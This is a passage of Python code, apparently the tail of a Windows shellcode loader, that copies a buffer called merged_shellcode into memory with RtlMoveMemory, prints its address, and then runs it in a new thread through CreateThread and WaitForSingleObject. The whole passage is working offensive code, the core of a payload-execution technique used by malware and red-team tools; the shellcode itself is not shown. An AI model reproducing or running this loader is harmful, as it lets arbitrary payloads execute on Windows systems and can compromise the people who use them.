    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(merged_shellcode)))
    print("\n\n[+] Shellcode located at address %s" % hex(ptr))
    input("\n[!] Press any key to execute shellcode with CreateThread...")
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 